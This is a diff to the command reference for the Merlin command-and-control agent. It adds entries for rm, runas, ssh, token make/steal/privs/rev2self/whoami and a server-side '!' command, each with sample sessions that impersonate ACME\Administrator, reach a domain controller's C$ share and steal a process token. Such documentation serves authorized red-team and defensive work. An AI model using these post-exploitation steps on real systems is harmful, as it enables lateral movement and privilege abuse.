@@ -68,6 +68,9 @@ The ``core`` commands are available to every agent regardless of which operating
                | showall"                       |
       pwd      | Display the current working    | pwd
                | directory                      |
+      quit     | Exit and close the Merlin      | -y
+               | server                         |
+      rm       | Remove, or delete, a file      | <file path>
       run      | Execute a program directly,    | run ping -c 3 8.8.8.8
                | without using a shell          |
       sessions | Display a table of information |
@@ -81,6 +84,8 @@ The ``core`` commands are available to every agent regardless of which operating
                | to checkin                     |
       sleep    | Set the agent's sleep interval | sleep 30s
                | using Go time format           |
+      ssh      | Execute command on remote host | ssh <user> <pass> <host:port>
+               | over SSH (non-interactive      | <program> [<args>]
       status   | Print the current status of    |
                | the agent                      |
       touch    | Match destination file's       | touch <source> <destination>
@@ -88,8 +93,8 @@ The ``core`` commands are available to every agent regardless of which operating
                | (alias timestomp)              |
       upload   | Upload a file to the agent     | upload <local_file>
                |                                | <remote_file>
-      *        | Anything else will be execute  |
-               | on the host operating system   |
+     !         | Execute a command on the host  | !<command> <args>
+               | operating system               |
 
 .. _help linux:
 
@@ -136,9 +141,15 @@ These commands are only available to agents running on a ``Windows`` operating s
       pipes             | Enumerate all named pipes      |
       ps                | Get a list of running          |
                         | processes                      |
+      runas             | Run a program as another user  | <DOMAIN\USER> <password>
+                        |                                | <program> [<args>]
+      token             | Interact with Windows access   | <make | privs | rev2self |
+                        | tokens                         | steal | whoami >
       sharpgen          | Use SharpGen to compile and    | sharpgen <code> [<spawnto
                         | execute a .NET assembly        | path> <spawnto args>]
       uptime            | Retrieve the host's uptime
+
+.. _cd:
 
 cd
 --
@@ -181,6 +192,8 @@ The ``back`` command is used to leave the Agent menu and return back to the :doc
 
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» back
     Merlin»
+
+.. _download:
 
 download
 --------
@@ -303,6 +316,7 @@ The ``exit`` control type instructs the agent to exit or die. There is no respon
     Merlin»
     [-] Created job LHhrzSYuGS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 
+.. _execute-assembly:
 
 execute-assembly
 -----------------
@@ -374,6 +388,8 @@ The command requires the file path to the assembly you wish to execute in the ``
 
     [*] Completed collection in 0.122 seconds
 
+.. _execute-pe:
+
 execute-pe
 -----------------
 
@@ -421,6 +437,8 @@ The command requires the file path to the PE you wish to execute in the ``<pe pa
     mimikatz(commandline) # exit
     Bye!
 
+
+.. _execute-shellcode:
 
 execute-shellcode
 -----------------
@@ -669,6 +687,8 @@ The ``interact`` command takes one argument, the agent ID, and is used to switch
     Merlin[agent][c22c435f-f7c4-445b-bcd4-0d4e020645af]» interact d07edfda-e119-4be2-a20f-918ab701fa3c
     Merlin[agent][d07edfda-e119-4be2-a20f-918ab701fa3c]»
 
+.. _invoke-assembly:
+
 invoke-assembly
 ---------------
 
@@ -741,6 +761,7 @@ The ``jobs`` command will display a table of all active jobs assigned to the age
       UxegCkyROR | Sent    | AgentControl | 2020-12-18T11:45:11Z | 2020-12-18T11:45:38Z
       YqhfUvxkqZ | Created | CmdPayload   | 2020-12-18T11:45:44Z |
 
+.. _kill:
 
 kill
 ----
@@ -830,6 +851,8 @@ invoke-assembly_ command.
     [-] Results job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 
     [+] successfully loaded Hagrid into the default AppDomain
+
+.. _ls:
 
 ls
 --
@@ -1079,6 +1102,8 @@ The ``printenv`` command is an alias for the ``env`` showall_ command that enume
     GNOME_SHELL_SESSION_MODE=ubuntu
     SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
 
+.. _ps:
+
 ps
 --
 
@@ -1135,6 +1160,42 @@ quit
 ----
 
 The ``quit`` command is used to exit out of the Merlin Server application. This is also an alias for the ``exit`` command.
+
+.. _rm:
+
+rm
+--
+
+The ``rm`` command will remove or delete a file using native Go functions.
+
+`` rm <file path>``
+
+.. code-block:: text
+
+    Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» rm C:\\Users\\rastley\\Downloads\\lyrics.txt
+    [-] Created job jwGxSVYMDY for agent 336154be-9ab9-4add-96e6-69c79f1ce77d
+
+    [-] Results job jwGxSVYMDY for agent 336154be-9ab9-4add-96e6-69c79f1ce77d
+
+    [+] successfully removed file C:\Users\rastley\Downloads\lyrics.txt
+
+runas
+-----
+
+The ``runas`` command will run a program as another user. This is done using the `CreateProcessWithLogonW <https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw>`__ Windows API call.
+
+``runas <Domain\\User> <Password> <program> [<program args>]``
+
+.. code-block:: text
+
+    Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» runas ACME\\Administrator S3cretPassw0rd cmd.exe /c dir \\\\DC01.ACME.COM\\C$
+    [-] Created job PABQYrMLYO for agent 336154be-9ab9-4add-96e6-69c79f1ce77d
+
+    [-] Results job PABQYrMLYO for agent 336154be-9ab9-4add-96e6-69c79f1ce77d
+
+    [+] Created cmd.exe process with PID 2120
+
+.. _run:
 
 run
 ---
@@ -1342,6 +1403,8 @@ The ``code`` positional argument is the .NET code you want to compile and execut
     Impersonated: NT AUTHORITY\SYSTEM
     True
 
+.. _shell:
+
 shell
 -----
 
@@ -1468,6 +1531,28 @@ The ``sleep`` control type is used to change the amount of time that an agent wi
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
     [-]Created job npMYqwASOD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 
+ssh
+---
+
+The ``ssh`` command connects to target host over the SSH protocol, executes the provided command, and returns the results.
+
+.. warning::
+    This command is insecure by design because it does not validate the remote host's public key
+
+``ssh <username> <password> <host:port> <program> [<args>]``
+
+.. code-block:: text
+
+    Merlin[agent][fbef5b71-50bb-4d36-8a1b-2edf233eb578]» ssh rastley S3cretPassw0rd 192.168.100.123:22 /bin/sh -c \"ip address show eth0\"
+    [-] Created job pinIDJXDTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job pinIDJXDTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] Connected to 192.168.100.123:22 at 192.168.100.123:22 with public key ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJytZseMSAsUU6OE2X4TC518fcF3yxgFYIgYp4+xT9pa9n5449gcsKT/eO3hx9NXAtyOHImg/Ff8kdWs52bU3SA=
+    0: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+        link/ether 00:0c:29:z3:ff:91 brd ff:ff:ff:ff:ff:ff
+        inet 192.168.100.70/24 brd 192.168.100.255 scope global dynamic noprefixroute eth0
+           valid_lft 1781sec preferred_lft 1781sec
+
 status
 ------
 
@@ -1478,6 +1563,201 @@ The ``status`` command is used to simply print if the Merlin Agent is Active, De
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» status
     Active
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+
+token
+-----
+
+The ``token`` command is used to perform various operations with Windows `access tokens <https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens>`_.
+The following commands are available:
+
+* :ref:`token make`
+* :ref:`token privs`
+* :ref:`token rev2self`
+* :ref:`token steal`
+* :ref:`token whoami`
+
+Merlin keeps track of when a Windows access token was created or stolen. If there is a created or stolen token, it will be used with the following commands:
+
+* :ref:`cd`
+* :ref:`download`
+* :ref:`execute-assembly`
+* :ref:`execute-pe`
+* :ref:`execute-shellcode`
+* :ref:`invoke-assembly`
+* minidump
+* :ref:`kill`
+* :ref:`ls`
+* :ref:`ps`
+* :ref:`rm`
+* :ref:`run`
+* :ref:`shell`
+* :ref:`touch`
+* :ref:`upload`
+
+The following commands will make the Windows `CreateProcessWithTokenW <https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw>`_ API call:
+
+* :ref:`execute-assembly`
+* :ref:`execute-pe`
+* :ref:`execute-shellcode`
+* :ref:`run`
+* :ref:`shell`
+
+.. _token make:
+
+make
+^^^^
+
+The ``make`` command is use to create a new Windows access token with the Windows `LogonUserW <https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw>`_ API call. The token is created with a type ``9 - NewCredentials`` `logon type <https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types>`_. This is the equivalent of using ``runas.exe /netonly``.
+
+.. warning::
+    Type 9 - NewCredentials tokens only work for **NETWORK** authenticated activities
+
+.. note::
+    Commands such as ``token whoami`` will show the username for the process and not the created token due to the logon type, but will reflect the new Logon ID
+
+.. note::
+    There is an unregistered ``make_token`` command alias that can be use from the agent root menu prompt
+
+``token make <DOMAIN\\User> <password>``
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token make ACME\\Administrator S3cretPassw0rd
+    [-] Created job piloeJbKPp for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job piloeJbKPp for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] Successfully created a Windows access token for ACME\Administrator with a logon ID of 0xA703CF0
+
+.. _token privs:
+
+privs
+^^^^^
+
+The ``privs`` command enumerates the privilege associated with either the current process or a remote process.
+If the current process has a created or stolen, and process ID argument is not provided, then the applied token's
+privileges will be enumerated.
+
+``token privs [<PID>]``
+
+Current process:
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token privs
+    [-] Created job rBIkAAWkIr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job rBIkAAWkIr for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] Process ID 6892 access token integrity level: High, privileges (24):
+            Privilege: SeIncreaseQuotaPrivilege, Attribute:
+            Privilege: SeSecurityPrivilege, Attribute:
+            Privilege: SeTakeOwnershipPrivilege, Attribute:
+            Privilege: SeLoadDriverPrivilege, Attribute:
+            Privilege: SeSystemProfilePrivilege, Attribute:
+            Privilege: SeSystemtimePrivilege, Attribute:
+            Privilege: SeProfileSingleProcessPrivilege, Attribute:
+            Privilege: SeIncreaseBasePriorityPrivilege, Attribute:
+            Privilege: SeCreatePagefilePrivilege, Attribute:
+            Privilege: SeBackupPrivilege, Attribute:
+            Privilege: SeRestorePrivilege, Attribute:
+            Privilege: SeShutdownPrivilege, Attribute:
+            Privilege: SeDebugPrivilege, Attribute: SE_PRIVILEGE_ENABLED
+            Privilege: SeSystemEnvironmentPrivilege, Attribute:
+            Privilege: SeChangeNotifyPrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
+            Privilege: SeRemoteShutdownPrivilege, Attribute:
+            Privilege: SeUndockPrivilege, Attribute:
+            Privilege: SeManageVolumePrivilege, Attribute:
+            Privilege: SeImpersonatePrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
+            Privilege: SeCreateGlobalPrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
+            Privilege: SeIncreaseWorkingSetPrivilege, Attribute:
+            Privilege: SeTimeZonePrivilege, Attribute:
+            Privilege: SeCreateSymbolicLinkPrivilege, Attribute:
+            Privilege: SeDelegateSessionUserImpersonatePrivilege, Attribute:
+
+Remote process:
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token privs 8156
+    [-] Created job BAKadQhkOc for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job BAKadQhkOc for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] Process ID 8156 access token integrity level: Low, privileges (2):
+            Privilege: SeChangeNotifyPrivilege, Attribute: SE_PRIVILEGE_ENABLED_BY_DEFAULT,SE_PRIVILEGE_ENABLED
+            Privilege: SeIncreaseWorkingSetPrivilege, Attribute:
+
+.. _token rev2self:
+
+rev2self
+^^^^^^^^
+
+The ``rev2self`` command leverages the `RevertToSelf <https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself>`_
+Windows API function and releases, or drops, any access token that have been created or stolen.
+
+.. note::
+    There is an unregistered ``rev2self`` command alias that can be use from the agent root menu prompt
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token rev2self
+    [-] Created job ZXKyKuIZru for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job ZXKyKuIZru for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] Successfully reverted to self and dropped the impersonation token
+
+
+.. _token steal:
+
+steal
+^^^^^
+
+The ``steal`` command obtains a handle to a remote process' access token, duplicates it through the
+`DuplicateTokenEx <https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex>`_
+Windows API, and subsequently uses it to perform future post-exploitation commands.
+
+.. note::
+    There is an unregistered ``steal_token`` command alias that can be use from the agent root menu prompt
+
+``token steal <PID>``
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token steal 1320
+    [-] Created job xBDIToajju for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job xBDIToajju for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] Successfully stole token from PID 1320 for user ACME\Administrator with LogonID 0x39DF3C
+
+.. _token whoami:
+
+whoami
+^^^^^^
+
+The ``whoami`` command leverages the Windows `GetTokenInformaion <https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation>`_ API call to return information
+about both the process and thread Windows access token. This information includes:
+
+* Username
+* Token ID
+* Logon ID
+* Privilege Count
+* Group Count
+* Token Type
+* Token Impersonation Level
+* Integrity Level
+
+``token whoami``
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token whoami
+    [-] Created job UZXXIILnYD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job UZXXIILnYD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] Process (Primary) Token:
+            User: ACME\rastley,Token ID: 0x9CA475E,Logon ID: 0x26C3A6,Privilege Count: 24,Group Count: 14,Type: Primary,Impersonation Level: Anonymous,Integrity Level: High
+    Thread (Primary) Token:
+            User: NT AUTHORITY\SYSTEM,Token ID: 0x9CC08EB,Logon ID: 0x3E7,Privilege Count: 28,Group Count: 4,Type: Primary,Impersonation Level: Impersonation,Integrity Level: System
+
+.. _touch:
 
 touch
 -----
@@ -1504,6 +1784,8 @@ The ``touch`` command is used to duplicate a timestamp from one file to another.
     [-] Results job gTFZbcgeJW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 
     [+] -rw-rw-r-- 1 rastley rastley 0 Sep 16  2020 /tmp/deleteMe.txt
+
+.. _upload:
 
 upload
 ------
@@ -1537,3 +1819,23 @@ The ``uptime`` command uses the Windows API GetTickCount64 method to determine h
 
     [+]
     System uptime: 853h31m14.921s
+
+!
+-
+
+Any command that begins with a ``!`` (a.k.a bang or exclamation point) will be executed on host itself where the Merlin server is running. This is useful when you want simple information, such as your interface address, without having to open a new terminal.
+
+.. code-block:: text
+
+    Merlin» !ip a show ens32
+
+    [i] Executing system command...
+
+    [+] 2: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+        link/ether 00:0c:29:z3:ff:91 brd ff:ff:ff:ff:ff:ff
+        inet 192.168.211.221/24 brd 192.168.211.255 scope global dynamic noprefixroute ens32
+           valid_lft 1227sec preferred_lft 1227sec
+        inet6 fe80::a71d:1f6a:a0d1:7985/64 scope link noprefixroute
+           valid_lft forever preferred_lft forever
+
+    Merlin»
